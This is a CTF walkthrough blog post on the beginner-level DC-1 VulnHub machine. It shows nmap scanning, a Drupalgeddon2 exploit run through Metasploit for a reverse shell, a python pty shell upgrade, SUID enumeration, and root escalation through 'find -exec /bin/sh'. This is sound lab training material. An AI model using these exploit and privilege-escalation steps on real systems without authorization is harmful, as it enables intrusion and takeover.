<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">DC-1: Vulnhub Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/dc-1-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2019-03-06T17:13:11+00:00">March 6, 2019</time><time class="updated" datetime="2025-06-10T20:11:49+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Hello friends! Today we are going to take another boot2root challenge known as “DC-1: 1”. The credit for making this VM machine goes to “DCAU” and it is another boot2root challenge in which our goal is to get root access to complete the challenge. You can download this VM <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.vulnhub.com/entry/dc-1-1,292/#download">here</a></span>.</span></p>
<p><span style="color: #000000;"><strong>Security Level</strong>: Beginner</span></p>
<p><span style="color: #000000;"><strong>Penetrating Methodology:</strong></span></p>
<ul>
<li><span style="color: #000000;">IP Discovery using netdiscover</span></li>
<li><span style="color: #000000;">Network scanning (Nmap)</span></li>
<li><span style="color: #000000;">Surfing HTTPS service port (80)</span></li>
<li><span style="color: #000000;">Finding Drupal CMS</span></li>
<li><span style="color: #000000;">Exploiting Drupalgeddon2 to get </span>a reverse<span style="color: #000000;"> shell</span></li>
<li><span style="color: #000000;">Finding files with SUID bit set</span></li>
<li><span style="color: #000000;">Finding </span>the “<span style="color: #000000;">find” command with SUID bit set</span></li>
<li><span style="color: #000000;">Getting root shell with “find” command</span></li>
<li><span style="color: #000000;">Getting final flag</span></li>
</ul>
<p><span style="color: #000000;"><strong>Walkthrough</strong></span></p>
<p><span style="color: #000000;">Let’s start off with scanning the network to find our target.</span></p>
<pre class="lang:default decode:true">netdiscover</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-NRddfp_jLfc/XH_2_Xvqt9I/AAAAAAAAdVA/IraukG58tFg2X1DDpODAIZGd_1hhLHR7gCLcBGAs/s1600/0.png"/></span></p>
<p><span style="color: #000000;">We found our target –&gt; 192.168.1.104</span></p>
<p><span style="color: #000000;">Our next step is to scan our target with nmap.</span></p>
<pre class="lang:default decode:true">nmap -sV 192.168.1.104</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-vhWA1ro7VRc/XH_2_pc1JPI/AAAAAAAAdVI/vF1zLXY74Nk54r__DUHQpnkXrdczt5ViQCLcBGAs/s1600/1.png"/></span></p>
<p><span style="color: #000000;">The NMAP output shows us that there are 3 ports open: 22(SSH), 80(HTTP), 111(RPC)</span></p>
<p><span style="color: #000000;">We find that port 80 is running http, so we open the IP in our browser.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-oNN_NSK4-2A/XH_2_ldOaiI/AAAAAAAAdVE/RJCIqjFJ4n8cJ8cGMez7iIAazE_QFGv5ACLcBGAs/s1600/2.png"/></span></p>
<p><span style="color: #000000;">When we access the web service we find that the server is running Drupal CMS. As the target system is running Drupal CMS, we can check if it is vulnerable to Drupalgeddon2 exploit. We run the exploit using </span>Metasploit<span style="color: #000000;"> on the target machine and successfully able to get a reverse shell.</span></p>
<pre class="lang:default decode:true">msf5 &gt; use exploit/unix/webapp/drupal_drupalgeddon2
msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; set rhosts 192.168.1.104
msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; run</pre>
<p><span style="color: #000000;">After getting a reverse shell we spawn a TTY shell using python. Then we find </span>a file<span style="color: #000000;"> with </span>suid<span style="color: #000000;"> permission on the server and find that the “find” command has SUID bit set.</span></p>
<pre class="lang:default decode:true">python -c 'import pty; pty.spawn("/bin/bash")'
find / -perm -u=s -type f 2&gt;/dev/null</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-CM7Qx7-xzDc/XH_3AYM2ruI/AAAAAAAAdVM/e6oghXbHN2E6kMgvhpJfKCNBXiFH1MaawCLcBGAs/s1600/3.png"/></span></p>
<p><span style="color: #000000;">As “find” command has SUID bit set, we can execute </span>the command<span style="color: #000000;"> as “root” user. We create a file called “raj” and use “find” command to check if is executing the commands as root user, the reason for creating a file is so that we can use with “find” command. As running it with a single file will run the command only once.  </span></p>
<p><span style="color: #000000;">After executing the command “whoami”, we find that we can run commands as root user. We now execute “/bin/bash” using “find” command and are successfully able to spawn a shell as </span>root<span style="color: #000000;"> user. We now go to /root directory and find a file called “thefinalflag.txt”. We take a look at the content of the file and find a congratulatory message for completing the VM.</span></p>
<pre class="lang:default decode:true">touch raj
find raj -exec "whoami" \;
find raj -exec "/bin/sh" \;</pre>
<p><img decoding="async" style="color: #000000;" src="https://2.bp.blogspot.com/-1qVUgJRp1h8/XH_3At__PFI/AAAAAAAAdVQ/wtLFsYk6VVAPAC15CLjQ_nDauIorhUCmQCLcBGAs/s1600/4.png"/></p>
<p><span style="color: #000000;"><strong>Author: </strong>Sayantan Bera is a technical writer at hacking articles and cybersecurity enthusiast<strong>. Contact <a style="color: #000000;" href="https://www.linkedin.com/in/sayantan-bera-2098a613b/">Here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
